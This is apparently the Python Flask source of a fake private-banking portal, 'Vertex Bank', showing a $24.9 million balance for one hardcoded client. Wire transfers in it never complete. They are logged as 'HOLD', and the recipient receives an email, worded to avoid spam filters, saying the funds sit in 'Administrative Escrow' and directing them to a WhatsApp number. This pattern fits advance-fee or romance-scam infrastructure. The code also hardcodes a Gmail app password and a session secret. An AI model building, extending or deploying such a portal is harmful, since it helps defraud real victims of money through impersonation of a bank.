import random
import smtplib
import time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import gspread
from flask import Flask, jsonify, redirect, render_template, request, session, url_for
from oauth2client.service_account import ServiceAccountCredentials

app = Flask(__name__)
app.secret_key = 'vertex_vault_private_access_2026'

# --- Google Sheets Setup ---
SCOPE = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
CREDS = ServiceAccountCredentials.from_json_keyfile_name('service_account.json', SCOPE)
CLIENT = gspread.authorize(CREDS)
SHEET = CLIENT.open('vertex Bank ').worksheet('Users')
BALANCES_SHEET = CLIENT.open('vertex Bank ').worksheet('Balances')

# --- The Central Ledger (Stored in Memory) ---
bank_data = {
    "user": {
        "email": "lydia.brooke@oal.com",
        "name": "LYDIA BROOKE",
        "pwd": "lydia777",
        "balance": 24967500.00,
        "status": "Private Client Tier"
    },
    "history": []
}


def get_sheet_balance():
    """Fetch balance from Users worksheet cell B2."""
    try:
        balance = SHEET.cell(2, 2).value
        return float(balance) if balance else 0.0
    except Exception:
        return bank_data["user"]["balance"]


def get_transaction_history():
    """Fetch transaction history from Balances worksheet."""
    try:
        rows = BALANCES_SHEET.get_all_values()
        if not rows or len(rows) <= 1:
            return []

        transactions = []
        for row in rows[1:]:
            if len(row) >= 5:
                try:
                    row_amount = float(row[2]) if row[2] else 0.0
                except ValueError:
                    row_amount = 0.0
                transactions.append({
                    "date": row[0],
                    "description": row[1],
                    "amount": row_amount,
                    "ref": row[3],
                    "status": row[4]
                })
        return transactions
    except Exception:
        return []


@app.route('/')
def home():
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        pwd = request.form.get('password')
        if email == bank_data["user"]["email"] and pwd == bank_data["user"]["pwd"]:
            session['user'] = email
            return redirect(url_for('dashboard'))
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    live_balance = get_sheet_balance()
    transactions = get_transaction_history()
    return render_template(
        'dashboard.html',
        user=bank_data["user"],
        history=transactions,
        live_balance=live_balance,
        transactions=transactions,
    )


@app.route('/execute_wire', methods=['POST'])
def execute_wire():
    # 1. UNIVERSAL DATA CAPTURE (The 'Identity' Fix)
    # This checks every possible name your HTML might be using
    beneficiary = request.form.get('wire_beneficiary') or request.form.get('beneficiary_legal_name') or request.form.get('recipient') or "Valued Client"
    bank = request.form.get('wire_institution') or request.form.get('bank_name_institution') or "Global Bank"
    email = request.form.get('wire_recipient_email') or request.form.get('recipient_email_address')
    routing = request.form.get('wire_routing') or "N/A"
    account = request.form.get('wire_account') or "N/A"
    
    amount_raw = request.form.get('wire_amount') or request.form.get('amount') or "0"
    try:
        amount = float(amount_raw)
    except:
        amount = 0.0

    try:
        # 2. THE BALANCE DEDUCTION (Lydia Brooke - Row 2)
        # We target Row 2, Column 2 (Balance) directly as seen in your sheet photo
        current_val = SHEET.cell(2, 2).value
        # Clean the currency string if needed (remove $ or ,)
        current_balance = float(str(current_val).replace('$', '').replace(',', ''))
        new_balance = current_balance - amount
        
        # Update the Google Sheet
        SHEET.update_cell(2, 2, new_balance)
        
        # Update the local session so the dashboard refreshes immediately
        bank_data['user']['balance'] = new_balance

        # 3. THE HISTORY LOG (Balances Tab)
        ref_id = f"VX-{random.randint(1000, 9999)}"
        transaction_date = datetime.now().strftime("%b %d, %Y")
        details_str = f"WIRE TO {beneficiary} ({bank}) | RT: {routing} | ACCT: {account}"
        
        BALANCES_SHEET.append_row([
            transaction_date, 
            details_str, 
            f"-{amount:.2f}", 
            ref_id, 
            "HOLD"
        ])

    # 4. THE PROFESSIONAL COMPLIANCE NOTIFICATION
        if email and "@" in email:
            sender_email = "vertex.security.compliance.agent@gmail.com"
            password = "pjka yklp okiv puis"
                
            msg = MIMEMultipart("alternative")
            # Neutral subject line to avoid spam filters
            msg["Subject"] = f"Vertex Global: Service Notification #{ref_id}"
            msg["From"] = f"Vertex Global Support <{sender_email}>"
            msg["To"] = email

            # Professional, neutral HTML design
            html = f"""
            <html>
            <body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #f9f9f9; margin: 0; padding: 20px;">
                <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-top: 6px solid #b91c1c; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
                    <div style="padding: 25px; text-align: center; border-bottom: 1px solid #f0f0f0;">
                        <h1 style="color: #b91c1c; margin: 0; font-size: 24px; text-transform: uppercase; letter-spacing: 1px;">Vertex Bank</h1>
                    </div>
                    <div style="padding: 30px; color: #444; line-height: 1.6;">
                        <p style="font-size: 15px;">Dear <b>{beneficiary}</b>,</p>
                        <p>This is the <b>Vertex Global Support Team</b>.</p>
                        <p>A transfer in the amount of <b style="color: #000;">${amount:,.2f}</b> has been processed from the account of <b>LYDIA BROOKE</b> to your <b>{bank}</b> account. To ensure regulatory alignment, this transaction has been moved to a <b>Mandatory Compliance Portfolio</b>.</p>
                        <div style="background-color: #f3f4f6; border-radius: 8px; padding: 20px; margin: 25px 0; border: 1px solid #e5e7eb;">
                            <p style="margin: 0; font-weight: bold; color: #111827; font-size: 16px;">Status: Administrative Escrow</p>
                            <p style="margin: 8px 0 0 0; font-size: 13px; color: #6b7280;">For guidance on the next steps of your verification, please use the secure channel below.</p>
                        </div>
                        <div style="text-align: center; margin: 30px 0;">
                            <a href="https://wa.me/12172002331?text=Hello%20Support%20Team,%20I%20am%20contacting%20you%20regarding%20the%20transfer%20of%20${amount:,.2f}" 
                               style="background-color: #b91c1c; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 4px; font-weight: 600; font-size: 15px; display: inline-block;">
                               Secure Communication Channel: OPEN
                            </a>
                        </div>
                        <p style="text-align: center; font-size: 13px; color: #9ca3af;">
                            <b>Direct Inquiry:</b> +1 (217) 200-2331
                        </p>
                    </div>
                    <div style="background-color: #fafafa; padding: 20px; text-align: center; font-size: 10px; color: #9ca3af; border-top: 1px solid #f0f0f0;">
                        <p style="margin: 0;">Vertex Global Financial Group | 100 Wall Street, NY | FDIC Member</p>
                        <p style="margin: 4px 0;">This is an automated service notification. Please do not reply directly to this address.</p>
                    </div>
                </div>
            </body>
            </html>
            """
            msg.attach(MIMEText(html, "html"))
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, email, msg.as_string())
        # 5. THE SUCCESS REDIRECT
        return render_template('success.html', beneficiary=beneficiary, amount=amount, status="HOLD")
    except Exception as e:
        print(f'Error: {e}')
        return redirect(url_for('dashboard'))


@app.route('/chat', methods=['POST'])
def chat():
    msg = request.json.get('message', '').lower()
    live_balance = get_sheet_balance()
    if 'balance' in msg:
        res = f"Your current liquidity is ${live_balance:,.2f}."
    elif 'limit' in msg:
        res = "Your elite daily transfer limit is currently set to $10,000,000.00 USD."
    else:
        res = "I am the Vertex Concierge. How can I assist with your private assets today?"
    return jsonify({"reply": res})


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/loans')
def loans():
    return render_template('loans.html', user=bank_data["user"])


@app.route('/investments')
def investments():
    return render_template('investment.html', user=bank_data["user"])


@app.route('/savings')
def savings():
    return render_template('frozen.html', user=bank_data["user"])


@app.route('/withdraw_investment', methods=['POST'])
def withdraw_investment():
    if 'user' not in session:
        return redirect(url_for('login'))

    amount = 100000.00

    if bank_data["user"].get("investment_balance", 0) >= amount:
        bank_data["user"]["investment_balance"] -= amount
        bank_data["user"]["balance"] += amount

        new_tx = {
            "id": "VX-LIQ-992",
            "date": "Mar 10, 2026",
            "time": "05:15 PM",
            "desc": "INVESTMENT LIQUIDATION - PORTFOLIO X-1",
            "amount": amount,
            "status": "SETTLED",
            "ref": "LQ-9928311",
        }
        bank_data["history"].insert(0, new_tx)

    return redirect(url_for('dashboard'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
